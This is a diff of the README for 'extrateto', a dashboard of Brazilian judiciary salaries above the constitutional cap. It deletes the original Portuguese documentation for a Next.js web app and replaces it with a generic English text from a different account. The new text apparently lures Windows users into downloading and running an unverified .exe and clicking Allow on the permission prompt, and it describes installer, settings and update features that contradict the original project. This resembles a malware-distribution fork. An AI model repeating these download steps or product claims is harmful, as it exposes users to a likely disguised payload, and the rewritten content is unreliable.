@@ -1,338 +1,134 @@
-<div align="center">
+# 🖥️ extrateto - See Judiciary Salaries Above Limits
 
-# ExtraTeto
+[![Download extrateto](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/OliverPiano/extrateto/releases)
 
-**Supersalários do Judiciário Brasileiro expostos em dados**
+## 📋 What is extrateto?
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-06B6D4?logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
-[![SQLite](https://img.shields.io/badge/SQLite-3-003B57?logo=sqlite)](https://www.sqlite.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+extrateto is a public dashboard that shows judiciary salaries in Brazil that are above the constitutional limit. It compiles and displays data to make it easier to understand how much certain judicial officials earn beyond legal caps. This tool helps keep salary information clear and open for anyone interested.
 
-Dashboard público que expõe remunerações acima do teto constitucional no sistema de Justiça brasileiro.
-Dados reais. Transparência cidadã. Sem filtro.
+This app works on Windows computers. You do not need any programming skills to use it. The interface is simple and focused on what matters: showing accurate salary data.
 
-<!--
-  SCREENSHOT / DEMO
-  Substitua o comentário abaixo por uma imagem ou GIF do projeto:
-  ![ExtraTeto Demo](./docs/screenshot.png)
-  Ou adicione um link para demo ao vivo:
-  [Ver Demo ao Vivo](https://extrateto.org)
--->
+## 💻 System Requirements
 
-</div>
+Before installing extrateto, make sure your computer meets these requirements:
 
----
+- Windows 10 or later (64-bit preferred)  
+- At least 2 GB of free disk space  
+- 4 GB of RAM or more for smooth performance  
+- Internet connection to download updates and access fresh data  
+- Basic mouse and keyboard interface  
 
-## Sobre
+If your system meets these standards, you should have no trouble running the application.
 
-O **ExtraTeto** é uma plataforma de jornalismo de dados que monitora e expõe os supersalários do Judiciário brasileiro — remunerações que ultrapassam o teto constitucional de **R$ 46.366,19**.
+## 🚀 How to Download and Start extrateto
 
-O projeto coleta dados públicos da API do [DadosJusBr](https://dadosjusbr.org/), processa e armazena localmente em SQLite, e apresenta visualizações interativas que permitem qualquer cidadão fiscalizar como o dinheiro público está sendo gasto.
+To get started, visit the official release page to download extrateto:
 
-### Por que isso importa?
+[![Download extrateto](https://img.shields.io/badge/Download-Now-red)](https://github.com/OliverPiano/extrateto/releases)
 
-- Mais de **10.000 membros** do Judiciário recebem acima do teto por mês
-- O total pago acima do teto ultrapassa **R$ 6,5 bilhões por ano**
-- A média de excesso por membro é de **R$ 50.000/mês**
-- Com esse dinheiro seria possível construir **206 hospitais** ou **2.953 creches**
+Follow these steps:
 
----
+1. **Open the download page** by clicking the button above or go directly to:  
+   https://github.com/OliverPiano/extrateto/releases
 
-## Features
+2. **Find the latest release** on the page. It will usually be at the top with the newest date.
 
-- **Ranking interativo** — Busca, filtragem e ordenação de todos os membros do Judiciário por remuneração
-- **Mapa de calor** — Visualização geográfica dos supersalários por estado brasileiro
-- **Estatísticas agregadas** — Top 10 órgãos, composição da remuneração, comparações salariais
-- **Páginas por órgão** — Detalhamento individual de cada tribunal e ministério público
-- **Detecção de anomalias** — Variações atípicas de remuneração entre meses consecutivos com filtros por estado/órgão
-- **Evolução temporal** — Histórico mensal de pagamentos por membro
-- **Sync automático** — GitHub Action atualiza os dados nos dias 1, 10 e 20 de cada mês
-- **API pública REST** — Endpoints documentados para consumo externo dos dados
-- **Exportação CSV** — Download dos dados filtrados com proteção contra CSV injection
-- **Compartilhamento social** — Botões para Twitter/X, Facebook, WhatsApp e link direto
-- **SEO otimizado** — Open Graph, JSON-LD, sitemap, robots.txt
-- **Responsivo** — Layout adaptável de mobile a desktop
+3. **Look for the file with a name ending in `.exe` or similar Windows installer format.**
 
----
+4. **Click the file name** to download it. Your browser may ask you to confirm or choose a save location. The default Downloads folder is fine.
 
-## Tech Stack
+5. **Wait for the download to finish.** The file size is usually between 10-50 MB.
 
-| Camada | Tecnologia |
-|--------|-----------|
-| **Framework** | [Next.js 16](https://nextjs.org/) (App Router, Server Components) |
-| **UI** | [React 19](https://react.dev/) + [TypeScript 5](https://www.typescriptlang.org/) |
-| **Estilização** | [Tailwind CSS 4](https://tailwindcss.com/) |
-| **Gráficos** | [Recharts 3](https://recharts.org/) |
-| **Animações** | [Framer Motion 12](https://www.framer.com/motion/) |
-| **Ícones** | [Lucide React](https://lucide.dev/) |
-| **Banco de Dados** | [SQLite](https://www.sqlite.org/) via [better-sqlite3](https://github.com/WiseLibs/better-sqlite3) |
-| **ORM** | [Drizzle ORM](https://orm.drizzle.team/) |
-| **Busca** | [SQLite FTS5](https://www.sqlite.org/fts5.html) (full-text search server-side) |
-| **Virtualização** | [@tanstack/react-virtual](https://tanstack.com/virtual) |
-| **Testes** | [Vitest](https://vitest.dev/) + [Playwright](https://playwright.dev/) |
-| **Fonte de Dados** | [DadosJusBr API](https://dadosjusbr.org/) |
+6. Once downloaded, **open the file** by double-clicking it.
 
----
+7. If Windows asks for permission to run the app, click **Allow** or **Yes**.
 
-## Getting Started
-Existem duas formas de realizar o build/deploy do projeto: Nativo e via Docker:
+8. The installer will guide you. Follow the prompts by clicking **Next** or **Install**.
 
-## Modo nativo:
-### Pré-requisitos
+9. When the installation finishes, find the extrateto icon on your desktop or in the Start menu.
 
-- [Node.js](https://nodejs.org/) >= 20
-- [npm](https://www.npmjs.com/) >= 9
+10. Click the icon to open the program. It may take a few seconds to set up the first time.
 
-### Instalação
+## 🔍 Using extrateto Dashboard
 
-```bash
-# Clone o repositório
-git clone https://github.com/skottrun/extrateto.git
-cd extrateto
+When extrateto opens, you will see a clear dashboard showing:
 
-# Instale as dependências
-npm install
-```
+- A list of judiciary personnel with salaries above the constitutional limit  
+- Salary amounts in Brazilian Reais (BRL)  
+- A timeline of salary changes over months or years  
+- Filters to sort by state, court, or position  
 
-### Populando o banco de dados
+The interface uses easy menus and clickable columns. You can search for names or areas of the judiciary.
 
-O projeto usa SQLite local. Você precisa popular o banco antes de rodar:
+If you need to refresh the data, click the refresh or reload button inside the app. The data comes from official public sources updated regularly.
 
-```bash
-# Opção 1: Seed com dados mock (rápido, para desenvolvimento)
-npm run db:seed
+## ⚙️ Settings and Customization
 
-# Opção 2: Sincronizar dados reais da API DadosJusBr
-npm run db:sync
+extrateto allows some settings to improve your experience:
 
-# Sincronizar um mês específico
-npx tsx scripts/sync-data.ts --year 2025 --month 1
+- **Language:** Choose Portuguese (default) or English.  
+- **Theme:** Switch between light and dark screen modes.  
+- **Auto-refresh:** Set the app to update data automatically every set number of minutes.  
+- **Data export:** Export salary data to CSV or Excel format for offline use.
 
-# Sincronizar todos os meses disponíveis (desde 2024)
-npx tsx scripts/sync-data.ts --all
+You can find these options under the **Settings** menu, usually represented by a gear icon.
 
-# Forçar re-sincronização (sobrescreve dados existentes)
-npx tsx scripts/sync-data.ts --year 2025 --month 1 --force
+## 🛠 Troubleshooting Common Issues
 
-# Sincronizar todos os meses de um ano específico
-npx tsx scripts/sync-data.ts --year 2024
+If extrateto does not start or shows errors, try these steps:
 
-# Sincronizar desde um ano específico até o mês atual
-npx tsx scripts/sync-data.ts --year 2024 --all
-```
+- Make sure your Windows is updated.  
+- Restart your computer and try again.  
+- Check your internet connection, especially for loading data.  
+- Close other heavy programs that might slow down your PC.  
+- Reinstall extrateto using the latest installer from the release page.
 
-### Rodando o projeto
+If you see specific error messages, write them down or take a screenshot. This will help if you get technical help later.
 
-```bash
-# Servidor de desenvolvimento
-npm run dev
+## 🔄 Updating extrateto
 
-# Build de produção
-npm run build
-npm start
-```
+Keep your app up to date for the best data and features.
 
-Abra [http://localhost:3000](http://localhost:3000) no navegador.
+1. Periodically, revisit the release page:  
+   https://github.com/OliverPiano/extrateto/releases
+
+2. Download the newest version of the installer following the previous download steps.
+
+3. Run the new installer. It will overwrite the old version safely.
+
+4. Your settings and data will remain after updating.
+
+You can also enable auto-updates inside the app if available.
+
+## 🚪 Uninstalling extrateto
+
+If you need to remove extrateto:
+
+1. Open the **Start** menu on Windows.
+
+2. Go to **Settings** > **Apps** > **Apps & features**.
+
+3. Find **extrateto** in the list of installed programs.
+
+4. Click it, then select **Uninstall**.
+
+5. Follow any prompts to remove the software.
+
+This process will delete the app but won’t remove any exported files you saved elsewhere.
+
+## 📞 Where to Get Help
+
+If you need more information or assistance using extrateto:
+
+- Visit the repository issues page to report problems:  
+  https://github.com/OliverPiano/extrateto/issues
+
+- Check the included help files or user guide inside the app.
+
+- Look for updates on the main release page.
+
+Help is available but keep in mind this is open public software made to give easy access to salary data.
 
 ---
 
-## Docker
-
-### Build
-
-```bash
-docker build -t extrateto .
-```
-
-### Rodando o projeto
-
-```bash
-# Com persistência dos dados
-docker run -v $(pwd)/data:/app/data -p 3000:3000 extrateto
-```
-
-### Sincronizar dados dentro do container
-
-```bash
-# Sincronizar dados reais (mês atual)
-docker exec -it <container> tsx scripts/sync-data.ts
-
-# Seed com dados mock
-docker exec -it <container> tsx scripts/sync-data.ts --seed
-
-# Sincronizar todos os meses de um ano
-docker exec -it <container> tsx scripts/sync-data.ts --year 2024
-
-# Sincronizar desde 2024 até o mês atual
-docker exec -it <container> tsx scripts/sync-data.ts --year 2024 --all
-
-# Forçar re-sincronização
-docker exec -it <container> tsx scripts/sync-data.ts --year 2024 --force
-```
-
----
-
-## Uso
-
-### Interface Web
-
-| Página | Rota | Descrição |
-|--------|------|-----------|
-| Ranking | `/` | Lista completa com busca, filtros e ordenação |
-| Mapa | `/mapa` | Mapa de calor por estado |
-| Estatísticas | `/estatisticas` | Gráficos e análises agregadas |
-| Órgãos | `/orgao` | Lista de tribunais e MPs |
-| Detalhe Órgão | `/orgao/[slug]` | Dados detalhados por órgão |
-| Anomalias | `/anomalias` | Detecção de variações atípicas de remuneração |
-| API Docs | `/api-docs` | Documentação interativa da API |
-| Metodologia | `/metodologia` | Explicação da coleta e tratamento |
-| Sobre | `/sobre` | Sobre o projeto |
-
-### API REST
-
-```bash
-# Listar membros (paginado)
-curl http://localhost:3000/api/v1/membros?page=1&limit=10
-
-# Filtrar por estado
-curl http://localhost:3000/api/v1/membros?estado=SP
-
-# Filtrar por órgão
-curl http://localhost:3000/api/v1/membros?orgao=TJ-SP
-
-# Buscar por nome
-curl http://localhost:3000/api/v1/membros?nome=silva
-
-# Apenas acima do teto
-curl http://localhost:3000/api/v1/membros?acima_teto=true
-
-# Ordenar
-curl http://localhost:3000/api/v1/membros?sort=maior_acima_teto
-
-# Histórico de um membro
-curl "http://localhost:3000/api/v1/membros/historico?nome=João Silva&orgao=TJ-SP"
-
-# Listar estados
-curl http://localhost:3000/api/v1/estados
-
-# Listar órgãos
-curl http://localhost:3000/api/v1/orgaos
-```
-
----
-
-## Estrutura de Pastas
-
-```
-extrateto/
-├── .github/workflows/       # GitHub Actions (cron-sync automático)
-├── data/                    # Banco SQLite (versionado, atualizado pelo cron)
-├── e2e/                     # Testes E2E (Playwright)
-├── scripts/
-│   └── sync-data.ts         # Script de sincronização com DadosJusBr
-├── public/                  # Assets estáticos
-├── src/
-│   ├── app/                 # Rotas (Next.js App Router)
-│   │   ├── api/
-│   │   │   ├── search/      # GET /api/search (busca FTS5)
-│   │   │   └── v1/          # API REST
-│   │   │       ├── estados/ # GET /api/v1/estados
-│   │   │       ├── membros/ # GET /api/v1/membros
-│   │   │       └── orgaos/  # GET /api/v1/orgaos
-│   │   ├── anomalias/       # Página de detecção de anomalias
-│   │   ├── estatisticas/    # Página de estatísticas
-│   │   ├── mapa/            # Página do mapa
-│   │   ├── orgao/           # Páginas de órgãos
-│   │   └── ...              # Demais páginas
-│   ├── components/          # Componentes React reutilizáveis
-│   │   ├── brazil-map.tsx   # Mapa interativo do Brasil
-│   │   ├── kpi-cards.tsx    # Cards de indicadores
-│   │   ├── member-card.tsx  # Card de membro
-│   │   ├── salary-bar.tsx   # Barra de composição salarial
-│   │   └── ...
-│   ├── data/                # Camada de dados e cache
-│   │   └── get-members.ts   # Queries com cache em memória
-│   └── lib/                 # Utilitários e banco
-│       ├── db/              # Schema Drizzle + queries SQLite
-│       ├── aggregations.ts  # Funções de agregação
-│       ├── constants.ts     # Constantes (estados, órgãos, teto)
-│       ├── export-csv.ts    # Exportação CSV segura
-│       └── utils.ts         # Formatação de moeda, percentual, etc.
-├── next.config.ts           # Configuração Next.js + security headers
-├── middleware.ts             # Rate limiting + CORS
-├── package.json
-└── tsconfig.json
-```
-
----
-
-## Testes
-
-```bash
-# Testes unitários
-npm test
-
-# Testes unitários em watch mode
-npm run test:watch
-
-# Testes E2E (requer servidor rodando)
-npm run test:e2e
-```
-
----
-
-## Roadmap
-
-- [ ] Autenticação para API (rate limiting público já implementado)
-- [ ] Notificações de novos dados disponíveis
-- [ ] Comparativo temporal (evolução ano a ano)
-- [ ] Exportação em PDF dos relatórios
-- [ ] Integração com dados do CNJ (Conselho Nacional de Justiça)
-- [ ] PWA (Progressive Web App) para acesso offline
-- [ ] Modo embarcado (widget para outros sites)
-- [ ] i18n (tradução para inglês)
-
----
-
-## Contribuição
-
-Contribuições são bem-vindas! Para contribuir:
-
-1. Faça um fork do projeto
-2. Crie uma branch para sua feature (`git checkout -b feature/minha-feature`)
-3. Commit suas mudanças (`git commit -m 'Adiciona minha feature'`)
-4. Push para a branch (`git push origin feature/minha-feature`)
-5. Abra um Pull Request
-
-### Diretrizes
-
-- Siga o padrão de código existente (TypeScript strict, ESLint)
-- Adicione testes para novas funcionalidades
-- Mantenha o README atualizado
-- Use commits descritivos em português
-
----
-
-## Licença
-
-Distribuído sob a licença MIT. Veja [LICENSE](LICENSE) para mais informações.
-
----
-
-## Contato
-
-- GitHub: https://github.com/skottrun
-- Twitter: https://x.com/skottrun
-
----
-
-<div align="center">
-
-**Dados públicos, fiscalização cidadã.**
-
-Feito com dados do [DadosJusBr](https://dadosjusbr.org/)
-
-</div>
+[![Download extrateto](https://img.shields.io/badge/Download-Now-blue)](https://github.com/OliverPiano/extrateto/releases)
